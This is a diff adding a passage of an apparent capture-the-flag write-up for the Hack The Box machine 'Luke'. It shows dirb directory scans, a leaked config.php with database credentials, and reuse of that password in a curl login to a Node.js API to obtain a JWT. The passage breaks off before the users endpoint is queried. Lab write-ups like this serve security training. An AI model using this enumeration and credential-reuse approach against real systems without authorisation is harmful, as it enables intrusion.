@@ -88,4 +88,116 @@ Normally you should know where to look but hurry up because I will delete them s
 Derry  
 ```
 
-Nothing much ..
+Nothing much ..so let's fire up the dirb<br/>
+```
+[sarthak@sarthak luke]$ dirb http://10.10.10.137                                                                                       
+                                                                                                                                       
+-----------------                                                                                                                      
+DIRB v2.22                                                                                                                             
+By The Dark Raver                                                                                                                      
+-----------------                                                                                                                      
+                                                                                                                                       
+START_TIME: Sat Jun  1 20:12:36 2019                                                                                                   
+URL_BASE: http://10.10.10.137/                                                                                                         
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt                                                                                   
+                                                                                                                                       
+-----------------                                                                                                                      
+
+GENERATED WORDS: 4612                                                           
+
+---- Scanning URL: http://10.10.10.137/ ----
+==> DIRECTORY: http://10.10.10.137/css/                                                                                                
++ http://10.10.10.137/index.html (CODE:200|SIZE:3138)                                                                                  
+==> DIRECTORY: http://10.10.10.137/js/                                                                                                 
++ http://10.10.10.137/LICENSE (CODE:200|SIZE:1093)                                                                                     
++ http://10.10.10.137/management (CODE:401|SIZE:381)                                                                                   
+==> DIRECTORY: http://10.10.10.137/member/                                                                                             
+==> DIRECTORY: http://10.10.10.137/vendor/         
+```
+<br/>
+management seems interesting Let's see what it has ....
+
+picture 007
+
+It requires credentials let's keep it for future..
+<br/>
+Meanwhile in background i ran another dirb for extensions like php,zip,txt...we got a hit
+
+```
+[sarthak@sarthak luke]$ dirb http://10.10.10.137 -X .html,.php,.zip,.txt
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sat Jun  1 21:25:16 2019
+URL_BASE: http://10.10.10.137/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+EXTENSIONS_LIST: (.html,.php,.zip,.txt) | (.html)(.php)(.zip)(.txt) [NUM = 4]
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.10.137/ ----
++ http://10.10.10.137/config.php (CODE:200|SIZE:202) 
+```
+And from that we got this :)
+```
+$dbHost = 'localhost'; $dbUsername = 'root'; $dbPassword = 'Zk6heYCyv6ZE9Xcg'; $db = "login"; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error);
+```
+<br/>
+So we got :-<br/>
+
+```
+username:root
+password:Zk6heYCyv6ZE9Xcg
+```
+I tried these credentials on management didn't worked so now let's enumerate port 3000 which is node js framework and it works on JWT so it will require a token and [this](https://medium.com/dev-bits/a-guide-for-adding-jwt-token-based-authentication-to-your-single-page-nodejs-applications-c403f7cf04f4) helped alot to get me a token
+
+so building it with curl<br/>
+
+```
+curl -X POST http://10.10.10.137:3000/login -H 'Content-Type: application/json' -d '{"username":"admin", "password":"Zk6heYCyv6ZE9Xcg"}'
+```
+<br/>
+Output
+```
+{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5NDA2MDAzLCJleHAiOjE1NTk0OTI0MDN9.s5A4cg4X7PJCuKScwF3oSsi8Rln9vCJ1at0FT4zl40w"}
+```
+<br/>
+We have a token now we can use it with ``` Authorization: Bearer <token>``` in our burp on port 3000 <br/>
+
+Before that we shall run dirbuster to see any directories or files which could be helpful...
+
+```
+[sarthak@sarthak ~]$ dirb http://10.10.10.137:3000
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sat Jun  1 20:13:03 2019
+URL_BASE: http://10.10.10.137:3000/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.10.137:3000/ ----
++ http://10.10.10.137:3000/login (CODE:200|SIZE:13)                                                                                   
++ http://10.10.10.137:3000/Login (CODE:200|SIZE:13)                                                                                   
++ http://10.10.10.137:3000/users (CODE:200|SIZE:56)                                                                                   
+                                                                                                                                      
+-----------------
+END_TIME: Sat Jun  1 20:35:01 2019
+DOWNLOADED: 4612 - FOUND: 3
+```
+<br/>
+we can see login section from where we got our token and we can see users so let's visit users with burp + token...
+
+
+
